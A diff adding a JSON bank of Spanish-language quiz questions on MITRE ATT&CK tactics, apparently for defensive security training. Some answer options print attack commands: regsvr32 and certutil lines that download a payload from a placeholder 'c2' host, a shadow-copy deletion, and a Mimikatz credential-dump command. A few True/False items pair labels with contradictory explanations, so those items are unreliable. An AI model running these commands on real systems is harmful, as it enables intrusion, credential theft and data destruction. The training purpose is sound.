@@ -1,0 +1,470 @@
+{
+  "mitre-01": {
+    "questions": [
+      {
+        "q": "¿Qué ID de táctica de ATT&CK cubre el Reconocimiento?",
+        "options": [
+          "TA0043",
+          "TA0042"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: El reconocimiento pasivo (usando Shodan, Censys, LinkedIn) envía tráfico directamente al objetivo y puede ser registrado por sus sistemas.",
+        "options": [
+          "Verdadero — las herramientas pasivas contactan al objetivo",
+          "Falso — el reconocimiento pasivo consulta índices públicos, sin dejar ninguna huella en los sistemas del objetivo"
+        ]
+      },
+      {
+        "q": "APT29 (Cozy Bear) pasó meses en reconocimiento antes de la brecha de SolarWinds. ¿Cuál era el objetivo principal del reconocimiento?",
+        "options": [
+          "La lista de clientes de SolarWinds y el pipeline de compilación",
+          "La cuenta de correo personal del CEO de SolarWinds"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Eliminar metadatos de documentos públicos (T1592.002) es una acción defensiva que reduce la información disponible para los reconocedores.",
+        "options": [
+          "Verdadero — los metadatos en PDFs pueden revelar el autor, el software y la estructura de la empresa interna",
+          "Falso — los metadatos de documentos están cifrados y los atacantes no pueden leerlos"
+        ]
+      },
+      {
+        "q": "¿Qué herramienta usaría un atacante para enumerar subdominios y direcciones de correo desde fuentes públicas (OSINT pasivo)?",
+        "options": [
+          "theHarvester (agregación pasiva de OSINT)",
+          "nmap -sV (escaneo activo de versiones de servicios)"
+        ]
+      }
+    ]
+  },
+  "mitre-02": {
+    "questions": [
+      {
+        "q": "El Desarrollo de Recursos (TA0042) cubre actividades que ocurren antes de que el atacante contacte al objetivo. ¿Cuál de estas es una técnica de Desarrollo de Recursos?",
+        "options": [
+          "T1583 — Adquirir Infraestructura",
+          "T1566 — Phishing"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Los registros de Transparencia de Certificados son una herramienta de los defensores para detectar certificados recién emitidos asociados con dominios de phishing.",
+        "options": [
+          "Verdadero — los registros CT son públicos y pueden monitorearse para detectar certificados sospechosos",
+          "Falso — los registros CT son privados y solo accesibles para las CAs"
+        ]
+      },
+      {
+        "q": "La Operación AppleJeus del Grupo Lazarus involucró construir empresas falsas de criptomonedas y troyanizar software. ¿Qué técnica de ATT&CK es esta?",
+        "options": [
+          "T1587 — Desarrollar Capacidades",
+          "T1584 — Comprometer Infraestructura"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Un dominio recién registrado con todos los detalles de WHOIS ocultos y un certificado recién emitido es un patrón de alto riesgo que requiere investigación.",
+        "options": [
+          "Verdadero — los nuevos dominios son comunes y no deben marcarse automáticamente",
+          "Falso — nuevo dominio + WHOIS oculto + nuevo certificado es un patrón de alto riesgo que indica probablemente infraestructura de ataque"
+        ]
+      },
+      {
+        "q": "¿Qué técnica ayuda a los defensores a detectar marcos C2 durante la fase de desarrollo de recursos mediante el análisis de huellas digitales de TLS?",
+        "options": [
+          "Identificar marcos C2 por sus firmas distintivas del handshake TLS (fingerprinting JA3)",
+          "Bloquear todo el tráfico TLS saliente desde los endpoints corporativos"
+        ]
+      }
+    ]
+  },
+  "mitre-03": {
+    "questions": [
+      {
+        "q": "Según los datos del DBIR de Verizon citados en este nivel, ¿qué porcentaje de las intrusiones de estados-nación comienzan con spear phishing?",
+        "options": [
+          "Más del 90%",
+          "Alrededor del 40%"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: DMARC p=reject configurado en un dominio evita que los atacantes suplanten ese dominio en correos de phishing dirigidos a terceros.",
+        "options": [
+          "Verdadero — DMARC p=reject hace que los servidores de correo receptores descarten los correos suplantados",
+          "Falso — DMARC solo registra los intentos de suplantación pero no puede bloquear la entrega"
+        ]
+      },
+      {
+        "q": "En el hackeo del DNC de 2016, APT28 obtuvo las credenciales de John Podesta. ¿Qué hacía al correo de phishing tan convincente?",
+        "options": [
+          "Suplantaba una alerta de seguridad de Google y enlazaba a una página de inicio de sesión de Google perfectamente recreada",
+          "Fue enviado desde una dirección de correo verificada de Google con un código de verificación incrustado"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Ver WINWORD.EXE generando powershell.exe como proceso hijo es un comportamiento normal esperado en redes empresariales.",
+        "options": [
+          "Verdadero — Word usa PowerShell para la ejecución de macros en operaciones normales",
+          "Falso — esta relación padre-hijo es un indicador de alta fidelidad de ejecución de macro maliciosa (T1566.001)"
+        ]
+      },
+      {
+        "q": "¿Qué técnica de seguridad de correo electrónico enruta los enlaces de los correos a través de un proxy que verifica los destinos en el momento del clic?",
+        "options": [
+          "Reescritura de URLs / protección en el momento del clic",
+          "Verificación de firma DKIM"
+        ]
+      }
+    ]
+  },
+  "mitre-04": {
+    "questions": [
+      {
+        "q": "El registro de bloques de script de PowerShell (Event ID 4104) captura el contenido decodificado de los comandos codificados de PowerShell. ¿Qué configuración del registro lo habilita?",
+        "options": [
+          "EnableScriptBlockLogging = 1 bajo la clave de registro de ScriptBlockLogging de PowerShell",
+          "EnableTranscription = 1 bajo la ruta de registro de Windows Defender"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Los LOLBins (binarios de vivir de la tierra) como certutil.exe, mshta.exe y regsvr32.exe son scripts de atacantes personalizados que evitan la detección.",
+        "options": [
+          "Verdadero — los LOLBins son scripts de atacantes personalizados que evitan la detección",
+          "Falso — los LOLBins son binarios legítimos de Microsoft firmados que los atacantes abusan para ejecutar código malicioso mientras parecen actividad del sistema legítima"
+        ]
+      },
+      {
+        "q": "NotPetya causó $10B en daños globales en 2017. ¿Qué técnicas de ejecución usó para propagarse?",
+        "options": [
+          "WMI (T1047) y PsExec (T1569.002) — herramientas legítimas de Windows al estilo LOLBin usadas para movimiento lateral",
+          "Exploits de kernel personalizados e instalación de controladores sin firmar"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: El Modo de Lenguaje Restringido (CLM) de PowerShell combinado con AppLocker previene efectivamente la mayoría de las técnicas de ejecución basadas en PowerShell.",
+        "options": [
+          "Verdadero — CLM + AppLocker bloquea la mayoría de las técnicas de atacantes de PowerShell",
+          "Falso — CLM solo se aplica a las sesiones interactivas de PowerShell, no a las ejecuciones de powershell.exe en proceso hijo"
+        ]
+      },
+      {
+        "q": "Un atacante usa la bandera `-Enc` al ejecutar powershell.exe. ¿Qué hace esta bandera y cómo la detectan los defensores?",
+        "options": [
+          "Codifica el comando en base64 para ofuscarlo; el Event ID 4104 captura el contenido decodificado si el registro de bloques de script está habilitado",
+          "Habilita la comunicación de red cifrada; los defensores deben capturar el tráfico de red para decodificar los comandos"
+        ]
+      }
+    ]
+  },
+  "mitre-05": {
+    "questions": [
+      {
+        "q": "¿Qué Event ID de Windows señala que se ha creado una nueva tarea programada — un mecanismo clave de persistencia?",
+        "options": [
+          "Event ID 4698",
+          "Event ID 4624"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: APT1 (Comment Crew) mantuvo acceso a redes víctimas durante un promedio de 356 días usando múltiples técnicas de persistencia simultáneamente.",
+        "options": [
+          "Verdadero — APT1 usó más de 20 técnicas de persistencia simultáneamente en todas sus operaciones documentadas",
+          "Falso — APT1 fue detectado rápidamente; dependía de la velocidad en lugar de la persistencia a largo plazo"
+        ]
+      },
+      {
+        "q": "Un atacante agrega una entrada a HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. ¿Qué técnica de ATT&CK es esta?",
+        "options": [
+          "T1547.001 — Claves de ejecución del registro / Carpeta de inicio",
+          "T1053.005 — Tarea programada/Trabajo"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Encontrar y eliminar un único mecanismo de persistencia (p. ej., una tarea programada maliciosa) es suficiente para remediar completamente un APT avanzado.",
+        "options": [
+          "Verdadero — una vez eliminada la tarea programada, se bloquea la reentrada",
+          "Falso — los atacantes sofisticados capas múltiples mecanismos de persistencia; eliminar uno es insuficiente sin una revisión exhaustiva de todos los vectores de persistencia"
+        ]
+      },
+      {
+        "q": "¿Qué herramienta de Sysinternals proporciona un inventario completo de todos los mecanismos de persistencia en un sistema Windows?",
+        "options": [
+          "Autoruns.exe",
+          "Process Monitor (procmon.exe)"
+        ]
+      }
+    ]
+  },
+  "mitre-06": {
+    "questions": [
+      {
+        "q": "El Kerberoasting (T1558.003) apunta a cuentas de servicio en Active Directory. ¿Qué solicita el atacante al controlador de dominio?",
+        "options": [
+          "Tickets de servicio (TGS) cifrados con la contraseña de la cuenta de servicio para descifrado offline",
+          "Datos de replicación del Controlador de Dominio que contienen todos los hashes NTLM del dominio"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: DCSync (T1003.006) requiere que el atacante acceda físicamente al Controlador de Dominio para extraer hashes de contraseñas.",
+        "options": [
+          "Verdadero — NTDS.dit solo puede copiarse con acceso físico o RDP al Controlador de Dominio",
+          "Falso — DCSync replica los hashes de contraseñas de AD de forma remota usando permisos de replicación de DC, sin necesidad de acceso físico"
+        ]
+      },
+      {
+        "q": "El ataque Golden SAML de APT29 durante la brecha de SolarWinds involucró robar qué material criptográfico?",
+        "options": [
+          "El certificado de firma de tokens de ADFS, permitiendo falsificar aserciones SAML para cualquier identidad en el arrendatario",
+          "El certificado TLS del Controlador de Dominio, permitiendo MITM en el tráfico de autenticación interno"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: El Event ID 4769 con tipo de cifrado RC4 (etype 23) en los tickets de servicio de Kerberos es un indicador de Kerberoasting.",
+        "options": [
+          "Verdadero — los entornos modernos deberían usar AES; los tickets de servicio RC4 indican que las cuentas de servicio tienen contraseñas débiles",
+          "Falso — los tickets Kerberos RC4 son estándar en todos los entornos de Active Directory y no indican actividad maliciosa"
+        ]
+      },
+      {
+        "q": "Golden SAML evita qué control de seguridad crítico en el que las organizaciones confían para proteger el acceso a aplicaciones cloud?",
+        "options": [
+          "Autenticación Multi-Factor (MFA), porque el token SAML falsificado ya incluye las afirmaciones de MFA completadas",
+          "Filtrado de salida del firewall, porque los tokens SAML viajan sobre HTTP y no pueden inspeccionarse"
+        ]
+      }
+    ]
+  },
+  "mitre-07": {
+    "questions": [
+      {
+        "q": "BYOVD (Bring Your Own Vulnerable Driver) es una técnica de evasión de defensa. ¿Qué permite hacer al atacante?",
+        "options": [
+          "Operar con privilegio de kernel para parchear las devoluciones de llamada del EDR, deshabilitando la visibilidad de detección desde el kernel",
+          "Evitar las reglas del Firewall de Windows enrutando el tráfico a través del espacio del controlador"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: certutil.exe realizando conexiones HTTP salientes es un comportamiento normal esperado en un endpoint corporativo.",
+        "options": [
+          "Verdadero — certutil contacta regularmente los servidores de Microsoft para validar listas de revocación de certificados",
+          "Falso — certutil.exe no debería hacer conexiones de red salientes en operaciones normales; esto es un IOC claro de abuso LOLBin"
+        ]
+      },
+      {
+        "q": "ALPHV/BlackCat usó un controlador Dell vulnerable (DBUtil_2_3.sys) para desactivar los sensores EDR antes de desplegar ransomware. ¿Qué control previene los ataques BYOVD?",
+        "options": [
+          "HVCI (Integridad de Código Protegida por Hipervisor) con una lista de bloqueo de controladores estricta que evita que los controladores vulnerables conocidos sean cargados",
+          "Protección en tiempo real de Windows Defender con actualizaciones de firmas"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: El Event ID 3 de Sysmon (Conexión de Red) puede detectar el abuso de LOLBin cuando herramientas como certutil.exe realizan conexiones de red inesperadas.",
+        "options": [
+          "Verdadero — Sysmon registra todas las conexiones de red con el nombre de la imagen del proceso, permitiendo la detección de LOLBins haciendo conexiones inesperadas",
+          "Falso — el Event ID 3 de Sysmon solo captura conexiones de procesos sin firmar"
+        ]
+      },
+      {
+        "q": "¿Qué técnica LOLBin (T1218.010) permite a un atacante ejecutar un scriptlet COM remoto sin desencadenar la mayoría de los controles de lista blanca de aplicaciones?",
+        "options": [
+          "regsvr32.exe /s /n /u /i:http://c2/payload.sct scrobj.dll",
+          "certutil.exe -urlcache -split -f http://c2/payload.exe"
+        ]
+      }
+    ]
+  },
+  "mitre-08": {
+    "questions": [
+      {
+        "q": "El comando `sekurlsa::logonpasswords` de Mimikatz vuelca credenciales de cuál proceso de Windows?",
+        "options": [
+          "LSASS (Servicio de Subsistema de Autoridad de Seguridad Local)",
+          "winlogon.exe (Aplicación de Inicio de Sesión de Windows)"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Habilitar Windows Credential Guard mueve las credenciales de LSASS a un enclave de Seguridad Basada en Virtualización (VBS) inaccesible para Mimikatz.",
+        "options": [
+          "Verdadero — Credential Guard aísla los secretos de LSASS en un enclave VBS inaccesible para herramientas de volcado de credenciales que se ejecutan en el SO normal",
+          "Falso — Credential Guard solo protege las credenciales de dominio, no las credenciales de cuentas locales"
+        ]
+      },
+      {
+        "q": "NotPetya se propagó mediante una cascada de credenciales. ¿Qué hacía que la reutilización de credenciales de administrador en todos los sistemas fuera tan destructiva?",
+        "options": [
+          "Comprometer un sistema con una credencial de administrador en caché daba acceso a todos los demás sistemas donde esa credencial era válida, propagando la infección exponencialmente",
+          "El atacante tenía acceso a un día cero que evitaba la autenticación en todos los sistemas de Windows"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: La autenticación WDigest que almacena contraseñas en texto plano en la memoria LSASS está habilitada por defecto en Windows moderno.",
+        "options": [
+          "Verdadero — WDigest siempre está habilitado y no puede deshabilitarse",
+          "Falso — WDigest está deshabilitado por defecto en Windows moderno; los atacantes deben habilitarlo mediante el registro antes de que las credenciales en texto plano estén disponibles"
+        ]
+      },
+      {
+        "q": "¿Qué combinación de Event ID de Sysmon y máscara de acceso detecta mejor un proceso no autorizado que lee la memoria de lsass.exe?",
+        "options": [
+          "Event ID 10 (Acceso a Proceso) apuntando a lsass.exe con GrantedAccess 0x1010 o superior",
+          "Event ID 4625 (Fallo de Inicio de Sesión) con SubStatus 0xC000006A"
+        ]
+      }
+    ]
+  },
+  "mitre-09": {
+    "questions": [
+      {
+        "q": "Pass-the-Hash (T1550.002) permite a un atacante autenticarse en sistemas remotos sin conocer la contraseña en texto plano. ¿Qué usa el atacante en su lugar?",
+        "options": [
+          "El hash NTLM directamente como credencial de autenticación",
+          "Un ticket TGT de Kerberos falsificado generado a partir del hash de la contraseña"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: En entornos empresariales modernos, ver el Event ID 4624 con Logon Type 3 (inicio de sesión de red) usando NTLM en lugar de Kerberos es una señal de alerta.",
+        "options": [
+          "Verdadero — los inicios de sesión de red deberían usar Kerberos; los inicios de sesión de red NTLM puro indican posible actividad de Pass-the-Hash o reutilización de credenciales heredada",
+          "Falso — los inicios de sesión de red NTLM son estándar y esperados en todos los entornos de Active Directory"
+        ]
+      },
+      {
+        "q": "El ataque de ransomware de Colonial Pipeline de 2021 comenzó con una cuenta VPN comprometida. ¿Qué control de seguridad único habría prevenido el acceso inicial?",
+        "options": [
+          "Autenticación Multi-Factor (MFA) en la cuenta VPN",
+          "Un firewall de próxima generación con inspección profunda de paquetes"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Restringir la autenticación de red NTLM (mediante Política de Grupo) y forzar Kerberos mitiga efectivamente los ataques Pass-the-Hash.",
+        "options": [
+          "Verdadero — PtH explota NTLM; forzar Kerberos elimina el vector de ataque porque los tickets de Kerberos no son reutilizables de la misma manera",
+          "Falso — Pass-the-Hash funciona igualmente bien con los tickets de Kerberos"
+        ]
+      },
+      {
+        "q": "CrackMapExec es usado por atacantes para rociar un hash NTLM en toda una subred. ¿Qué indica una respuesta 'Pwn3d!' del objetivo?",
+        "options": [
+          "El hash es válido y la cuenta tiene derechos de administrador en ese host objetivo",
+          "El host objetivo tiene la firma SMB deshabilitada y es vulnerable a ataques de retransmisión"
+        ]
+      }
+    ]
+  },
+  "mitre-10": {
+    "questions": [
+      {
+        "q": "APT29 (Midnight Blizzard) recopiló correos del entorno corporativo de Microsoft en 2023-2024 abusando de qué vector de acceso?",
+        "options": [
+          "La app OAuth heredada tenía permisos excesivos de Microsoft Graph API que permitían leer el correo de la dirección ejecutiva",
+          "APT29 explotó un día cero en el servidor de Exchange local de Microsoft"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Ejecutar `net view /domain`, `nltest /dclist` y `arp -a` desde un host interno es un indicador de enumeración de AD para reconocimiento interno.",
+        "options": [
+          "Verdadero — estos comandos nativos enumeran computadoras del dominio y vecinos de red y son indicadores de descubrimiento de hosts (T1018)",
+          "Falso — estas son herramientas administrativas que los atacantes no pueden usar sin privilegios de administrador de dominio"
+        ]
+      },
+      {
+        "q": "Un atacante ejecuta un script de PowerShell que recopila todos los archivos .docx, .xlsx y .pdf modificados en los últimos 30 días. ¿Qué táctica de ATT&CK es esta?",
+        "options": [
+          "TA0009 Recolección — específicamente T1119 Recolección Automatizada",
+          "TA0010 Exfiltración — específicamente T1048 Exfiltración a través de protocolo alternativo"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Una regla SIEM que alerta cuando una sola cuenta lee más de 500 archivos en menos de 5 minutos es una detección válida de recolección automatizada.",
+        "options": [
+          "Verdadero — esta anomalía basada en volumen es un indicador confiable de recolección automatizada (T1119)",
+          "Falso — 500 archivos por 5 minutos está dentro del rango normal para los sistemas de gestión documental"
+        ]
+      },
+      {
+        "q": "APT29 buscó específicamente en los correos recopilados palabras clave como 'APT29' y 'Midnight Blizzard'. ¿Qué objetivo indica esto?",
+        "options": [
+          "Recolección de contrainteligencia — reuniendo datos sobre lo que los defensores y analistas de amenazas saben sobre sus operaciones",
+          "Preparación de doble extorsión — identificando ejecutivos a quienes amenazar con exposición"
+        ]
+      }
+    ]
+  },
+  "mitre-11": {
+    "questions": [
+      {
+        "q": "La exfiltración no detectada de Equifax durante 76 días fue posibilitada por un único fallo de control. ¿Cuál fue?",
+        "options": [
+          "Un certificado de inspección SSL había expirado 19 meses antes, haciendo que el tráfico del atacante pasara sin inspección a través de la solución DLP de Equifax",
+          "La base de datos de firmas del IDS no había sido actualizada, omitiendo el patrón de ataque del atacante"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: La exfiltración mediante tunelización DNS (T1048.003) es fácilmente bloqueada por la mayoría de los firewalls empresariales.",
+        "options": [
+          "Verdadero — los firewalls empresariales bloquean el DNS saliente por defecto",
+          "Falso — DNS casi siempre está permitido en salida, haciendo que la tunelización DNS sea una de las técnicas de exfiltración más difíciles de bloquear"
+        ]
+      },
+      {
+        "q": "¿Qué característica de red del tráfico de exfiltración DNS lo hace detectable en los registros del firewall o del resolvedor DNS?",
+        "options": [
+          "Etiquetas de subdominio inusualmente largas (>50 caracteres) que contienen datos codificados en base32/64 como cargas útiles de consulta DNS",
+          "Tráfico UDP de alto volumen en puertos no estándar por encima del 1024"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Dividir los datos exfiltrados en 20 IPs de destino diferentes (como hizo el atacante de Equifax) hace que la exfiltración sea indetectable para las herramientas de monitoreo.",
+        "options": [
+          "Verdadero — distribuir el tráfico en muchas IPs hace que cada flujo individual parezca por debajo del umbral de alerta",
+          "Falso — el volumen total de salida siempre se rastrea; dividir las IPs no oculta la anomalía del volumen total"
+        ]
+      },
+      {
+        "q": "¿Qué técnica de exfiltración (T1567) mezcla datos robados con tráfico legítimo de la nube, haciéndolo difícil de distinguir de la copia de seguridad normal o de la sincronización de archivos?",
+        "options": [
+          "Subir a servicios de nube pública como Dropbox, Google Drive o OneDrive usando credenciales legítimas",
+          "Usar paquetes de solicitud/respuesta de eco ICMP para transportar datos codificados"
+        ]
+      }
+    ]
+  },
+  "mitre-12": {
+    "questions": [
+      {
+        "q": "REvil usó Kaseya VSA, una plataforma RMM, para desplegar ransomware a 1.500 empresas simultáneamente. ¿Qué técnica de ATT&CK es este vector de ataque?",
+        "options": [
+          "T1195.002 — Comprometer la Cadena de Suministro de Software (a través de la plataforma MSP/RMM)",
+          "T1486 — Datos Cifrados para Impacto (solo cifrado de ransomware)"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: Eliminar las Instantáneas de Volumen (vssadmin delete shadows /all) antes del cifrado aparece en los registros de Process Creation y es un indicador de pre-ransomware.",
+        "options": [
+          "Verdadero — la eliminación de VSS elimina las opciones de recuperación y aparece en los registros de creación de procesos como un precursor de ransomware muy confiable",
+          "Falso — el ransomware moderno omite la eliminación de VSS porque Windows 10 las protege automáticamente"
+        ]
+      },
+      {
+        "q": "¿Qué hace que las copias de seguridad inmutables (p. ej., AWS S3 Object Lock en modo COMPLIANCE) sean efectivas contra el ransomware?",
+        "options": [
+          "Los objetos de copia de seguridad inmutables no pueden eliminarse ni sobrescribirse incluso por las credenciales raíz de la cuenta durante el período de retención",
+          "Se almacenan en las instalaciones en un servidor con aislamiento de red al que el ransomware no puede llegar"
+        ]
+      },
+      {
+        "q": "Verdadero o Falso: El ataque de Kaseya VSA fue programado para el fin de semana festivo del 4 de julio. Este tiempo fue estratégico para maximizar el daño.",
+        "options": [
+          "Verdadero — el ransomware se despliega automáticamente independientemente de la hora del día",
+          "Falso — los atacantes apuntan deliberadamente a festivos y fines de semana para explotar la reducción de personal de seguridad, ralentizando la respuesta a incidentes"
+        ]
+      },
+      {
+        "q": "Los grupos de ransomware modernos practican la 'doble extorsión'. ¿Cuál es la segunda capa de presión más allá del cifrado?",
+        "options": [
+          "Amenazar con publicar públicamente los datos exfiltrados si el rescate no se paga, incluso si la víctima puede restaurar desde copias de seguridad",
+          "Lanzar un ataque DDoS contra el sitio web público de la víctima para amplificar la disrupción"
+        ]
+      }
+    ]
+  }
+}
